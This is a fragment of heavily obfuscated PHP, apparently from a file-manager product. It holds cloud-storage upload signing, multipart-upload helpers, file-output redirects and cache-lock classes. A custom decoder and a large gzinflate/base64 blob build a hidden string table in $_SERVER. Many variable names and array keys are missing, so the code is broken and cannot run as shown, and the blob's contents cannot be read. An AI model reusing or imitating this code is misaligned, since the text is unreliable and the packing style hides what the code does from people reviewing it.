uploadFormData($, $ = 3600) { $ =& $_SERVER[]; $ = $[213]; $߹Ǻ = $[253]; $ = $[62]; $靃 = gmdate($[254]); $ő = gmdate($[255]); $ = $[256]; $܉ = $ . $[12]; $㎧ = $[257]; $ = array($this->accessKey, $ő, $this->region, $, $); $媑 = implode($[8], $); $ٜ = array($[258] => gmdate($[1365], strtotime($[260])), $[261] => array(array($[262] => $this->bucket), array($[263] => $), array($[264], $[265], $[12]), array($[264], $[266], $[12]), array($[264], $[267], $[12]), array($[268] => $㎧), array($[269] => $媑), array($[270] => $߹Ǻ), array($[271] => $靃), array($[272] => $܉))); $ = base64_encode(json_encode($ٜ)); $ͩɰ = hash_hmac($[273], $ő, $[274] . $this->secret, !0); $ײӅ = hash_hmac($[273], $this->region, $ͩɰ, !0); $٣ = hash_hmac($[273], $, $ײӅ, !0); $ = hash_hmac($[273], $, $٣, !0); $ = hash_hmac($[273], $, $); $ = array($[230] => $[12], $[275] => $[12], $[263] => $, $[268] => $㎧, $[276] => $, $[277] => $媑, $[278] => $߹Ǻ, $[279] => $靃, $[280] => $܉, $[281] => $, $[196] => $this->getHost()); return $; } public function multiUploadFormData($ҍ, $ = 3600) { $Ȗ =& $_SERVER[]; $Ϭ = gmdate($Ȗ[1468]); $Ћ = array(); $ԃ = $this->client->getUploadId($this->bucket, $ҍ, $Ћ); if (!$ԃ) { return !1; } return array($Ȗ[238] => $ԃ, $Ȗ[196] => $this->getHost() . $Ȗ[8] . $this->pathEncode($ҍ), $Ȗ[239] => $Ϭ, $Ȗ[94] => $ҍ); } public function multiUploadAuthData($ѷ, $Κ = array()) { $خ =& $_SERVER[]; $ = isset($Κ[$خ[175]]) ? $Κ[$خ[175]] : $خ[12]; $ɓŸ = $Κ[$خ[94]]; unset($Κ[$خ[94]]); if (isset($Κ[$خ[240]])) { return $this->listUploadParts($ɓŸ, $Κ); } $Ė = array(); if (isset($Κ[$خ[1469]])) { $Ė[$خ[1470]] = $Κ[$خ[1469]]; } $ = explode($خ[198], $this->getHost()); $从 = array($خ[1471] => $[1], $خ[1472] => $خ[12], $خ[230] => $خ[120], $خ[275] => $Κ[$خ[76]]); $ʹ = $خ[243]; $ = $خ[8] . $this->pathEncode($ɓŸ) . $; $Ђ = $this->client->__getSignatureV4($Ė, $从, $ʹ, $); if (strpos($, $خ[242]) === 0) { if (isset($Ė[$خ[1470]])) { $ŷ = $Ė[$خ[1470]]; } else { if (isset($Ђ[$خ[1470]])) { $ŷ = $Ђ[$خ[1470]]; } else { $ŷ = hash($خ[273], $خ[12]); } } return array($خ[249] => $Ђ[$خ[249]], $خ[1470] => $ŷ, $خ[239] => $Ђ[$خ[1473]]); } return $Ђ[$خ[249]]; } public function listUploadParts($б, $ = array()) { $ =& $_SERVER[]; $Д޽ = str_replace($[250], $[12], $[$[175]]); $芖 = $this->client->listParts($this->bucket, $б, $Д޽); if (!$芖) { return !1; } $ = $[1474]; foreach ($芖 as $ֳ) { $ .= $[1475] . "\74\120\141\x72\164\x4e\165\x6d\142\145\162\x3e{$ֳ[$[1430]]}\x3c\57\120\x61\x72\164\116\165\155\x62\145\162\76\xa" . "\x3c\105\124\x61\x67\76{$ֳ[$[1431]]}\74\x2f\105\124\x61\x67\x3e\xa" . $[1476]; } $ .= $[1477]; $ = array(); $ = explode($[198], $this->getHost()); $ = array($[1471] => $[1], $[230] => $[120], $[275] => strlen($)); $֞؝ = $[241]; $Đ = $[8] . $this->pathEncode($б) . $[$[175]]; $Щ = $this->client->__getSignatureV4($, $, $֞؝, $Đ, $); return array($[249] => $Щ[$[249]], $[239] => $Щ[$[1473]], $[251] => $芖, $[1470] => $Щ[$[1470]]); } public function link($, $ӕ = array()) { return parent::link($, $ӕ); } public function fileOut($瓄, $ԋ = false, $ՕƲ = false, $֚዁ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[][1478])) { return parent::fileOutServer($瓄, $ԋ, $ՕƲ, $֚዁); } parent::fileOut($瓄, $ԋ, $ՕƲ, $֚዁); } public function fileOutImage($, $❈ = 250) { if (strstr($this->endpoint, $_SERVER[][1478])) { return parent::fileOutImageServer($, $❈); } parent::fileOutImage($, $❈); } public function fileOutLink($ݎ) { $Φ =& $_SERVER[]; if (substr($ݎ, 0, 7) == $Φ[1371]) { $ݎ = $Φ[1372] . substr($ݎ, 7); } header($Φ[162] . $ݎ); die; } public function getHost() { $ =& $_SERVER[]; $٧ = str_rtrim(parent::getHost(), $[8] . $this->bucket); $٧ = explode($[198], $٧); return $٧[0] . $[198] . $this->bucket . $[10] . $٧[1]; } } $_file = $_SERVER[$_SERVER[][1222]]; $_size = $_SERVER[][1479]; goto c螽ڍ; C̯: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $塍 =& $_SERVER[]; $܁Ғ = $GLOBALS[$塍[6]][$塍[393]]; self::$cachePath = $܁Ғ[$塍[214]][$塍[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Վ, $ێ = 0) { $ʦ =& $_SERVER[]; $ͼ = microtime(!0); $ = $ͼ + $ێ + 0.0001; $ = rtrim(self::$cachePath, $ʦ[8]) . $ʦ[898] . md5($Վ) . $ʦ[895]; if (file_exists($) && filemtime($) && filemtime($) < time() - 10) { @unlink($); } do { if (file_exists($)) { cacheLockWait(); continue; } $ = fopen($, $ʦ[899]); if (!$) { return !1; } $Ñ = flock($, LOCK_EX | LOCK_NB); self::$caches[$Վ] = array($ʦ[900] => $, $ʦ[214] => $); fwrite($, $); clearstatcache(); if ($ && $Ñ) { return !0; } cacheLockWait(); } while (microtime(!0) < $); $this->unlock($Վ); return !1; } public function lockGet($Έ) { $ӳƒ =& $_SERVER[]; $ = rtrim(self::$cachePath, $ӳƒ[8]) . $ӳƒ[898] . md5($Έ) . $ӳƒ[895]; return file_exists($); } public function unlock($) { $ٞ =& $_SERVER[]; $΢ = self::$caches[$]; if (!$΢) { return; } @flock($΢[$ٞ[900]], LOCK_UN); @fclose($΢[$ٞ[900]]); @unlink($΢[$ٞ[214]]); unset(self::$caches[$]); } } class CacheLockRedis { public function lock($͕, $ͷ = 10) { $ݲ = Cache::init(); $ = microtime(!0) + $ͷ; while (microtime(!0) < $) { $Գᆞ = $ݲ->get($͕); if (!$Գᆞ) { $ = $ݲ->setLock($͕, $, $ͷ); if ($) { return !0; } } else { if ($Գᆞ < microtime(!0)) { $ݲ->set($͕, $, $ͷ * 2); if ($ݲ->get($͕) === $Գᆞ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($؈) { return Cache::init()->get($؈); } public function unlock($) { return Cache::init()->remove($); } } goto d鑊; dȴ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\x80\xaf\xea\xea\xf2\xd7", "\x9f\xfe\xfe\xcd\xf8\xfd"); $_SERVER[] = explode("\174\4\174\2\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\170\34\325\325\150\102\157\77\241\204\222\344\375\311\240\330\110\262\267\110\356\226\55\333\53\355\312\132\173\265\53\166\127\56\110\142"."\x3c\xbb\x3b\xd2\x8e\xb5\xbb\xb3\x9a\x99\x55\xb3\x4d\x27\x84\x80\xe9\x3d\xd4\x80\xc1\x84\xd0\x7b\x71\x28\x9\xe4\x87\xd0\xbf\x9f\x16\x6a\x0\xdb\x74\x42\x8a\x21\x40\xc8\xbb\xe5\xdc\x32\xb3\x2b\xf8"."\337\367\336\367\75\203\275\367\236\133\346\226\163\317\75\367\334\163\316\175\364\215\233\236\174\346\317\353\167\131\277\323\372\235\156\173\371\347\217\236\177\31\15\223\377\166\245\341\237"."\x9c\xba\xc7\x77\xc8\x9f\x3\x4f\xfd\x45\x43\x43\xe7\x9c\xbd\xa6\xc7\xf7\x39\xe3\xf6\x1b\xb4\x9d\xda\x5e\xf8\xfc\xf7\xb7\x3f\x71\xc9\x7f\xbf\xf9\xc4\xaf\xd3\xb9\x45\xf7\x5e\x32\xf8\xe3\xef\x5c\x77".base64_decode('+IX3tqCstGQL/VFKpqPoY4bt2BSQNUsDxiANGyX6G6Q/PcmYpRdNR6fRAP1RoVXkXw==')."\x7b\xb8\x60\xb0\x74\x35\x9e\x48\xab\xa9\x9e\xee\xee\x48\x32\xd\x99\x5a\xe4\xf4\xa2\x99\x83\x50\x59\xb3\xb4\x22\x7c\xbf\xac\x5b\x36\x6a\x8d\x5c\x9d\x5a\x36\xcb\x7a\xc9\x5\x11\x80\x9c\xe6\x68\x19"."\xcd\x86\x9a\xc2\x6d\x6a\x38\xd2\x1d\x4b\xac\x56\xd3\xab\xbb\x23\x90\x23\xa3\xe\x57\x74\x6b\x9c\xc6\x48\x30\xe5\x68\x96\x93\x36\x8a\x3a\xcf\x31\x6a\xf1\x76\xb5\x45\x96\x46\xe3\x4a\x3a\x19\x8a\xa7"."\x42\xed\xe9\x68\x22\x4e\xc1\xed\x89\xae\xae\x68\xba\x1a\x9e\x4c\xc4\x62\x6d\xa1\xf6\xe5\xd5\x29\xdd\xc9\xd0\xd2\xae\x90\x82\xda\x57\xd0\x55\xa3\x34\x60\x36\x28\x6b\x68\xca\x1a\xa5\x91\x6\x3a\xc".base64_decode('vZCjwZLGmuOMlyGU5iE0TaVKoUAjcR7K6QNapQCjFZYjZcsoaqzTy/VxDqUBreKYRg==')."\51\113\43\221\61\307\322\4\34\265\65\213\46\132\57\101\125\251\110\54\322\236\126\160\3\225\216\144\242\113\201\111\50\152\266\243\133\312\312\316\110\62\242\340\106\267\326\223\276"."\xd6\x2b\x80\x2f\x71\x34\x14\x4a\x28\x16\x53\x26\xab\xc1\xd1\x8b\x65\x56\xd\x2d\x53\xa3\xb2\x44\x32\x1c\x49\x2a\x6d\xab\x15\x31\x42\x59\xb3\x58\x34\x4b\x1\x54\xb\x9a\x49\x47\x6a\x6a\x24\x99\xa4"."\1\37\240\167\54\212\47\15\42\211\216\216\124\204\307\240\163\107\304\120\113\146\2\176\272\142\271\201\202\243\216\150\205\12\103\323\41\372\133\17\77\360\153\332\200\272\303\106\311"."\250\0\232\102\25\246\311\227\25\4\52\54\267\316\40\172\16\2\105\124\336\204\225\207\226\341\10\15\266\56\242\277\13\40\123\106\305\151\272\345\250\172\51\153\346\214\22\54\326".base64_decode('xYB0mpMPWwbKQOMDZiHHwrYxAV0ZMAp6vFKUs/BoNm8UchZbX9+Uk0ZjfLnivCJWRg==')."\55\341\53\335\30\30\27\353\15\347\353\346\251\266\131\261\262\172\24\255\17\32\157\6\260\356\70\250\163\60\66\206\331\123\56\230\132\56\245\133\274\153\206\331\201\52\112\124\34".base64_decode('GVgh2TpMqxhGlAG+j1aF0VMjYYiti5w0YsGG3uP8X/f3LkH/NALp64M25fVCQdXHdA==')."\x58\x38\xc5\xdc\x6c\x9b\xd\x46\xd0\xce\x18\xa5\x20\x82\xd0\x68\x34\xa1\xe6\x35\x3b\xdf\x95\x9b\xad\x92\x52\x8c\xa2\xe6\xf4\xb1\x40\x39\x5f\x86\x55\xcd\x17\x72\x9f\xb\xb1\xf1\xd0\xc5\x4d\x27\x22"."\321\345\202\231\325\12\162\27\151\70\357\70\345\224\136\312\341\221\200\256\230\243\45\62\122\145\135\207\114\141\237\222\123\272\224\325\112\147\213\321\142\263\202\305\2\17\261\336\161"."\230\315\201\316\30\233\316\334\0\15\144\330\266\120\7\37\64\154\102\341\304\362\324\312\345\202\221\325\34\303\54\5\315\254\243\73\176\333\261\164\15\152\14\145\263\272\155\373\333"."\315\222\143\231\5\177\250\120\60\107\375\11\313\30\64\112\55\312\64\40\266\50\21\55\152\77\46\200\55\260\122\353\26\50\30\161\360\147\246\265\126\234\1\377\74\266\2\171\156".base64_decode('SyvZA7rlj8DKaFFQYzkVZNnChl02bQM3r0XRHEfL5jEFEdW3fkN+o1QwSnpV3shY2Q==')."\xb0\x74\x9b\xb5\x55\x59\xda\x95\x86\x4a\x50\xed\xba\xbf\xdb\xd2\x6\x8b\x5a\x8b\x52\xae\x64\xd0\xc8\xc0\x4a\xad\x1\xa3\xb9\x61\x68\x5a\x94\x2c\x8e\xfa\x94\x62\xc5\x76\xfc\x96\x8e\x48\x91\x81\xb6".base64_decode('Oxjk6IC/C68rQ8/5U4hiA3hm0ywFoY7C0ii0M53uVqMdaEuOR9SuULq9E5rtaIOszQ==')."\x31\x44\x87\x79\x95\xc\xb8\xca\x8f\xd6\x17\x46\xae\x38\xea\xab\x0\x76\x9b\xa3\xba\x85\x3e\xdc\x36\xde\xa2\xc\x99\xb9\x8c\x39\x16\x60\x49\x38\x73\xa\x11\x1a\x96\x19\x4f\x77\xd9\xf1\x27\xb5\xd2"."\40\36\237\314\270\243\333\136\122\325\206\66\360\300\0\135\314\201\214\76\140\132\320\33\173\144\320\75\27\61\275\64\350\344\131\335\251\110\162\105\44\251\246\22\35\351\225\241\44"."\xec\xf7\x25\x84\x48\x63\xac\x35\xf8\xeb\x5\x7f\x52\xcf\xa1\xd9\xc9\x3a\xac\x9c\x56\xc6\x3\xcb\xf2\xe0\xf5\x83\x3f\xce\x52\xf1\x9a\x62\x69\xb1\xe8\x52\x3c\x76\x61\xbf\x8d\x32\xf9\xe5\x5c\xac\xee".base64_decode('mFE0cPccnkIGGzEDS6FBQdLn1j57WkNfbnqjH/07rbG3LxyY1r84aIgyweZAszKjaQ==')."\216\322\215\270\23\103\53\50\320\351\252\34\115\112\142\271\173\130\4\302\227\314\222\376\15\203\203\267\67\211\62\170\206\225\2\223\221\43\172\42\251\264\332\25\111\167\46\302\360"."\xf5\x48\x8\x42\x31\x93\xae\x6c\xd6\xdb\x5e\xfa\xd3\xf\x8\xd0\x4f\x7f\x54\xc3\xee\x90\x76\x1e\x1c\xe5\x14\x4a\x35\x33\x6b\xd1\x64\x74\xe9\x8c\xc\xc3\xcc\x47\x8b\xda\xa0\xb4\xf\xa8\xee\x6d\x2"."\xc7\x70\x62\x97\x40\xe\x84\x65\x2b\x8d\x1c\xdf\x47\x50\xb4\x53\x37\x6\xf3\x30\x60\x6\xae\x2e\x6b\x16\x4c\x4b\x2b\x60\xea\xc9\x16\x8e\xce\x28\xda\xa0\x1\x14\xad\x5c\xa8\x20\x9c\x9\xe2\x2f\xa4".base64_decode('85ViBog+YhIHdUfwYPY4YlSKbHNDO6QTDbu2MIgFVTzPfYFyabBxCtSlzpjdhAGAog==').strrev('87ɻgR*yMwE,eH'."\n".'w!(Md1VE')."\xee\x2f\x70\x6f\x17\x8a\x6e\x59\xa6\x75\x18\xe4\x20\x61\x85\xec\x39\x78\xde\xa0\x72\x87\xef\xe0\x36\x5a\x3e\x2c\x9c\x37\xf9\x8e\x6f\x5a\x10\x6a\x9\x42\xbf\xa7\xce\xe8\x60\xfb\x61\x30\x35\x13\xfd".strrev('Azs+XxU&y^o)bc85J'."\n".'wG=6BVY6/')."\147\270\220\327\331\106\332\4\331\320\330\161\114\31\340\50\213\370\141\4\25\34\214\141\47\121\111\274\355\261\370\112\174\200\20\0\274\367\303\314\213\140\1\215\173\202\340\276\210"."\167\133\372\200\1\344\252\204\120\263\113\263\206\130\307\120\111\261\152\160\104\132\121\35\75\261\230\332\236\210\247\321\371\203\102\126\46\243\351\10\133\301\241\260\32\152\357\246\61".base64_decode('zpMQGly9wVLIyAyYZNSIoOAE0KZWNku27s9CCXE6qUrKiY0S6KzYXD375ZhfK074iw==')."\210\4\370\171\363\334\154\212\2\33\50\345\166\242\60\115\142\377\303\203\207\126\41\343\217\272\23\51\50\260\30\103\21\217\232\341\213\245\273\7\222\212\22\212\54\215\0\160\57"."\xc0\xaa\xbc\x6\x9c\x67\x68\x65\x8a\xed\x5d\x15\x94\xdf\x32\x26\x34\xd1\xa5\xc5\xac\x3d\xac\x23\xc5\x82\x60\x79\xdd\xbd\xf2\x8b\x99\x47\x55\xce\xf2\x77\x76\x85\xda\xfd\xa9\xce\xd0\x8c\xd9\x73\x28".base64_decode('dHUx15fuNOy+I3kcxm3UnqVaOiIPrOYZTc1s8SJGQ2rPan/Rj2vBQxZoampidU2fow==')."\344\21\125\2\364\65\113\71\62\55\60\130\231\112\166\210\255\20\55\313\170\76\174\50\266\375\243\6\43\250\123\70\173\74\245\32\135\246\270\267\16\250\242\102\170\73\125\313\342"."\217\251\250\106\247\142\313\103\203\326\121\16\25\62\30\53\113\241\132\141\20\215\262\223\57\312\100\61\323\64\256\123\16\213\117\26\37\105\74\266\265\166\63\266\356\21\163\65\316".base64_decode('tuxabVhVqw2rPG1YVd0GCrKNwRLqJduT0p3R+HK1KxGOxNRoHG3B6Wp4T3c4xFaqDA==').base64_decode('b0ukO13QHrQJrwjFot7skVXRVDpVMwnBeiKelHCb2p2MdERX8WhHNBILp9T2UHunyA==')."\23\17\165\105\370\316\253\27\162\166\320\235\137\105\334\104\212\13\67\324\21\54\250\141\130\250\272\344\11\52\73\51\253\202\130\40\306\122\207\1\207\356\142\361\20\351\211\312\220"."\264\302\170\35\176\250\52\262\335\240\250\1\215\324\30\107\330\100\177\32\225\120\112\161\312\52\247\373\231\161\36\44\335\140\161\264\225\301\367\25\340\154\252\132\240\342\74\155\22"."\xfb\x59\x1b\x10\x1a\x70\x38\x5f\xe3\x89\x23\x2a\x27\xd2\xd0\xc\x84\x88\x1c\xa\x61\x2\x99\x11\xf8\x8c\x81\x68\xa6\xe5\x84\x58\x73\x6\x84\xc\x48\x4d\x74\x47\x92\x21\x2c\x41\x52\x57\x26\x13\xf1"."\245\120\140\64\257\263\6\104\141\370\33\330\101\3\4\111\216\330\172\320\51\101\143\22\5\61\350\153\115\66\224\353\351\317\341\100\12\320\221\24\50\113\211\215\172\6\357\302\214"."\213\142\201\1\104\366\330\16\152\126\370\327\62\246\131\140\4\31\61\302\174\147\340\202\250\265\66\103\222\61\266\247\114\347\244\14\120\67\261\74\22\127\31\146\321\230\204\215\24".strrev('Ӎ=?ס:7,L`d9	bI&I')."\320\50\304\372\2\256\50\143\340\52\26\57\215\317\7\15\366\342\306\226\276\140\137\260\141\161\113\157\310\77\241\371\47\232\374\363\375\375\210\355\153\234\16\200\376\165\63\174\263"."\66\340\14\50\343\342\237\366\243\237\326\276\305\123\373\374\207\37\275\146\111\157\137\177\175\313\364\303\372\2\77\355\33\355\237\326\270\230\175\47\133\261\20\147\311\50\26\152\152"."\156\172\3\152\22\72\67\360\54\45\262\267\111\31\130\302\204\121\26\320\165\163\66\60\70\232\103\175\120\224\350\365\367\115\357\137\54\225\223\100\336\157\41\112\212\66\332\74\317"."\27\362\37\211\173\306\213\342\165\17\370\121\51\145\305\266\204\327\105\106\313\2\35\100\64\122\160\355\216\305\145\126\356\23\355\272\251\364\167\3\233\310\101\175\214\357\137\3\206".base64_decode('BdhZKRnDjGsu6cMQMB2G3xndGdUZeiC4K46Qg9F9lCTFCtKeQYQL0nbLmLyyik8Sow==')."\x3c\x86\xb6\x11\x98\xa7\x3d\x21\xb7\x9d\xd5\xca\x7a\x4a\xea\xa1\xaa\xa6\x43\x6d\xb1\x88\xca\x28\xc\x50\x62\x16\x27\x54\xb1\x8d\x8b\xaf\x51\xd7\x4\x45\x65\xf4\x21\x2b\xce\xaa\xe4\xe4\xe\x2b\xdf"."\x1e\x2e\x28\x84\x30\x50\xce\xbd\x85\x48\xf2\xed\x4a\x19\x33\xe1\xa\x9a\x71\x34\xb6\xa\xda\xc0\x95\xd6\x45\xa\x1d\x72\x28\xa7\xca\x13\x50\xd6\x18\x43\x88\x25\x4f\xba\x58\xf4\x98\x42\x41\x9b\xca".base64_decode('YoZsxDoz5jXY0NdX6dVz/b0I8TX/QP+6mRsa2XE22If+sEiohkxZ5dRQRYxYALeDiw==').strrev('i$gs9		&0A1:6FƑUpV9ŦL]')."\60\56\221\322\235\0\317\341\223\22\125\24\167\135\214\264\326\61\142\137\102\313\251\135\332\352\250\230\63\105\316\226\56\11\276\255\153\126\66\337\121\51\24\34\176\144\55\30\103".base64_decode('8AVYK3Ch4IfdYHqtoh2mxaRD06AZddNqZYyWSmYuI6Oa2GSXhhA7k1YamPBbicaVtg==')."\104\42\26\11\305\25\274\237\303\76\204\230\205\124\244\73\204\66\61\54\147\112\245\43\40\217\217\206\375\254\336\125\176\166\120\346\1\3\206\335\54\123\276\121\167\124\164\366\34"."\x62\x73\x29\x1f\xb5\xf1\x19\xc2\x87\xf\xbc\x3e\xcc\x5b\xf8\x50\xab\x7d\xf8\x8c\xec\x13\x27\x34\x9f\x10\x37\xfb\x46\xc\x7d\x94\x4\xf8\xe9\xc9\x7\x87\x2a\x9f\x38\xdd\x43\x30\x1a\xf6\x19\x76\x98"."\x1c\xe\xc9\x7\x48\x12\x6b\x2\x3a\x55\xa3\xc3\x4d\x41\x1b\xf7\xd1\xe6\xc4\xf4\x11\xbd\xe0\x63\xe7\x7e\x1f\x6b\xa3\x8f\x89\x3d\x7c\x44\x5c\x11\x86\x66\xf5\xa0\xe5\x4\xcd\x22\x41\x44\x35\xf3\x3e".base64_decode('jEAYf31CAO5Dh3HdIllgYMS50ifOnL5By6yUu9k3pRhtFgBEmzkgaZqOj0lSfLJIBQ==')."\x5a\x11\x62\xeb\xa4\xe6\x70\xd6\xee\xd\x19\x7f\x6f\x23\x0\xbf\x70\x52\xf5\x28\x7d\xcb\x64\x55\xcf\x87\x5b\x9a\xb4\x8e\xd6\x8\xe2\xaa\xd\x6c\x97\x73\xe5\x21\xc2\x1c\xce\x7d\xe2\x1\x17\xa1\x15"."\142\241\342\16\164\150\160\325\102\253\225\303\34\101\113\156\104\25\262\156\161\313\41\170\135\257\264\300\173\377\201\77\232\326\6\123\322\347\34\155\220\175\13\23\53\224\72\151\126"."\x1a\x4e\xea\xd9\xf1\xac\x10\x3f\x84\x25\xa1\x86\x3b\x56\x41\x35\xa4\xb4\x1\x4f\xb7\x7c\x64\x1d\xd5\x5a\x3\xb5\xe7\x98\xe3\x35\x9f\x92\xbd\xf6\xdc\x93\x8d\x31\x43\x76\x3e\xbf\xae\x35\xf2\xed\xab".base64_decode('E/pFSGCiLJgI2lhMhlNoU+sosEGZIScDAfa5Y3hxBQhBJteGKS6ZikU60sqyBKJehg==')."\251\322\62\52\316\254\220\177\314\222\342\252\233\15\227\322\112\322\105\134\53\345\50\144\15\242\364\153\132\353\330\107\352\134\305\5\232\270\33\341\143\121\245\32\361\360\160\313\203"."\200\321\201\164\137\354\116\14\224\20\233\141\5\70\77\315\206\63\30\226\353\101\110\147\60\61\265\62\136\112\344\106\0\130\273\134\337\305\121\261\246\30\112\50\370\3\76\211\127"."\xc1\x24\xc5\x2f\x56\x87\x14\x75\xf\xb9\x7\x23\x3d\x5b\x28\x1e\xa2\x6e\xa3\x34\x6e\x94\x52\x46\xb1\x5c\xa8\x82\x8a\x5d\x58\x30\x1\x78\x71\x8b\x18\xc5\xca\xc9\xc2\x74\x13\xc1\x22\x1a\x5a\xbf\xf"."\256\353\174\5\243\64\44\155\320\102\2\207\132\217\213\112\155\207\232\74\55\147\144\325\357\216\272\26\64\240\174\136\263\304\150\62\62\204\151\1\317\157\343\54\42\52\145\33\320".base64_decode('RgSH4iojERPbGWfNl4PuSmk07CO/nWgY5PXK5wcTEpaJ0iBEDGJosNAP6Uja9GEJMQ==')."\372\241\373\70\273\272\45\231\30\342\127\212\141\220\70\343\360\12\104\1\30\143\206\106\274\201\121\20\340\46\124\111\46\300\51\220\233\37\240\55\11\161\372\216\166\111\264\307\321".base64_decode('MGLeC2hrswJ4wSzFGxQbH0rrZARM6ajPUE7UlqpKk3MLwR+m/WKvYOMq1pt7/mloUA==')."\64\10\17\255\132\335\16\214\316\265\343\35\226\311\71\135\276\315\173\63\265\223\243\44\277\215\367\154\315\322\170\270\330\211\52\220\124\306\313\130\170\240\236\250\230\10\327\256\103"."\101\354\202\100\313\25\215\122\300\242\273\131\0\35\20\100\203\302\327\44\361\136\202\350\254\243\227\60\260\373\155\360\314\263\143\232\350\324\151\5\54\364\145\321\40\211\340\1\265".base64_decode('IBfseFOUOQZei40SJNLtZoxYyVRZYxSbM20Mk8kRoyKoKGmypPBA4jHO4GICEckZDg==')."\x86\xe0\x25\x67\xb2\x3b\xb\x91\x51\xec\x92\x2\x26\x93\x69\xb2\xdb\x54\x4d\xb1\x38\x2d\xf8\xa6\xba\x72\xba\x39\x4\x0\x4e\x23\xdb\x78\x40\x30\x34\xb5\x55\x47\xb2\x66\x19\xe6\x5d\xd2\x99\x2a\x9a"."\43\272\4\14\330\216\131\26\51\122\224\46\113\111\242\122\51\27\237\12\322\42\264\212\162\204\15\26\103\106\362\102\131\162\206\246\13\65\200\117\15\1\231\66\207\54\213\241\51"."\355\46\276\165\104\100\31\204\51\136\212\255\261\132\133\24\255\74\62\42\64\242\150\125\370\303\1\272\310\3\132\56\227\140\67\257\162\270\72\253\54\117\254\135\21\121\117\343\125"."\111\261\332\331\103\205\202\120\151\361\306\47\55\102\27\267\134\110\206\114\132\254\203\34\140\331\375\161\55\30\77\272\114\316\216\173\157\126\335\4\171\162\66\145\22\122\46\246\261".base64_decode('dhzt7O15o6TbfIO27FqU6f8zP1w98niFTIYuOE2SPGPNzBFdPidw8aqgRHyjrmI/gA==')."\x5\x90\x22\xaa\xe3\x62\xa3\x92\xa4\x7e\x69\x39\xb9\x30\x4\x2d\x5f\x3a\x1e\x78\x63\x8a\x26\x2\xf6\x24\x38\xeb\xcd\xa7\x33\xe1\x33\xa1\x81\x63\x7c\x3f\x95\xb\xe1\x24\x3c\x97\x72\xa5\x82\x6d\x13"."\xf1\x2e\x76\x8f\x58\xb3\x30\xff\x92\xe0\xe7\xe4\x7c\x8\x91\x71\xc2\x64\xd\x67\xc9\xbc\x96\x33\x5f\x7a\xe1\xf3\xcb\xdf\xa3\xe1\xb\x5f\x3f\xf1\x82\x67\x6f\x86\x7e\xd8\xba\x91\x29\xc3\x1e\xb6\x1e"."\353\351\356\114\303\102\123\367\244\125\343\346\333\217\36\264\373\221\177\137\127\270\365\276\237\275\335\161\153\341\261\223\57\276\167\325\352\223\375\275\167\356\373\370\216\37\77\171\100".base64_decode('u9Xw7A+tzX9+5uxX/zX47JyXvzqrLnLXkrvyzwaOvGLXP324W/7MK/b8ovj+T9+oaw==')."\x7f\x2a\xf4\xdc\x51\xf5\x3f\xd3\x9e\xba\xff\xb3\x81\x6d\x5b\xe6\x3e\x30\x7a\xda\xdf\x12\x47\xff\xe5\x9d\xa5\x89\xa3\xe7\x2d\x79\xe9\x3b\x9b\x77\xff\xc3\x61\xfb\xe4\x5f\x3f\x76\xce\xe1\x67\xda\xf1"."\x27\x1e\x6c\x7e\x71\xc5\x8a\xf3\x5f\xdc\x58\x89\x7f\xf7\xb7\x6f\xec\xdd\xba\x68\xc7\x11\xf3\xca\x33\xb2\x8f\xbc\x75\xcc\x82\xc6\xe3\x8a\xa7\x2d\x5d\x1f\x3e\x65\xe6\xa1\x4b\x1e\xae\xbf\xe8\xed\xbf"."\x3e\x78\xcd\xd9\xdf\x6d\xfb\xc5\x29\xaf\xc6\x4b\xd6\x33\x43\xfb\xbf\x9b\xd9\xeb\x9c\xc6\x7d\x9f\x3f\xfb\xa8\x2d\xeb\xba\x5f\xfc\xe2\x8b\xd0\x4d\x8f\xed\x79\xea\xe9\x83\xf\x19\xaf\xff\xe4\x8b\x53".base64_decode('j//L5jOnn/CqMfWzv2w/9Ysv9z77icXrPvrhT/Ibvr4hfU7oti1P/6H3hh0DmzZdGw==')."\325\276\23\375\372\367\307\235\263\160\307\165\47\154\121\262\317\217\255\271\173\305\143\267\236\377\302\213\153\226\375\130\333\366\43\377\254\256\103\167\271\344\264\45\153\136\332\365\225"."\206\103\224\316\165\263\237\136\354\257\277\342\77\166\157\264\133\337\277\344\245\251\7\76\270\365\216\236\370\165\225\375\56\14\75\374\332\145\47\157\333\357\223\237\337\360\320\247\117".strrev('`MW߿7k|/CfW=l|K|~4').base64_decode('v/vaX9pwYbphn+PXHH/K83uftd/wlYf89ayPzjx2ziPagcee+b3dbj7poLYpp1w67w==')."\x57\x2f\x25\xb2\xb7\x19\x3\xd7\xf4\xbc\xd7\xbc\xe8\xb5\x6b\x2\x6f\xd9\x3b\xed\xfe\x44\x74\xfd\x3e\xfd\x6f\x5e\xf1\xf5\x13\x87\x4c\x7c\xe7\x8f\x95\xfb\xbf\xde\x6f\xd9\x7\xbb\xed\x33\xff\xe8\xef".base64_decode('ZS8+NLbnicWfLBvd57vHbbh/9+l7/Dl6+afJvb9cs985m5537v5o1fl97z/02Hfvew==')."\x6b\xb7\x8e\xf3\xef\xf5\xc5\x7f\xfd\xf9\xd1\x3b\x7d\x72\xee\x47\x7\x5f\x71\xf3\x71\xa7\xec\x7d\xe2\x5f\xf\xbe\x6c\x6c\x8f\x9d\x3f\xb8\xf2\xed\x95\x67\xed\xbc\xe5\x83\x77\xce\x7f\xbb\xe5\xec\x65".base64_decode('D15x+LwXG2M7WprvuFi1v3fxzAM3PZk45/o9dqp77fj6fU66eevYVT796SOj44G3rg==')."\355\273\72\277\354\77\43\357\355\361\304\357\237\253\274\170\355\155\163\213\267\35\64\265\136\333\143\367\75\376\246\77\271\347\261\307\315\30\333\170\343\314\173\52\361\354\351\217\256"."\334\276\156\257\13\276\273\357\51\173\316\316\37\320\171\123\152\126\347\125\247\336\367\124\276\361\352\117\273\246\357\274\333\376\53\373\237\77\50\123\367\237\157\327\137\274\342\344\175"."\157\275\361\330\117\273\234\47\167\77\74\326\377\322\101\231\275\57\133\162